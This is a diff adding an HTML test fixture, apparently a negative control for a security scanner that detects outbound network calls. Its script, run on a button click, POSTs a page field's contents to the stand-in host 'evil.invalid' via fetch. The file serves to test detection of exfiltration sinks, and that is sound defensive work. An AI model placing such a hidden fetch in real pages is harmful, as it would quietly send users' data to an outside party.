@@ -1,0 +1,23 @@
+<!doctype html>
+<!--
+  SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
+  Expected sink: net-call (fetch), found INSIDE the markup. This fixture pins the
+  boundary between the two legs of the scanner: the sink is real JavaScript, so
+  it must be caught by scanSource() on the extracted <script> body — not by a
+  regex hunting for `https` in the file. A scanner that only matched attribute
+  URLs would miss it, and one that grepped the file would also "find" the string
+  in the decoy fixtures.
+-->
+<html lang="en">
+  <body>
+    <button id="send" type="button">send</button>
+    <script type="module">
+      document.getElementById('send').addEventListener('click', async () => {
+        await fetch('https://evil.invalid/collect', {
+          method: 'POST',
+          body: document.getElementById('code')?.value ?? '',
+        });
+      });
+    </script>
+  </body>
+</html>
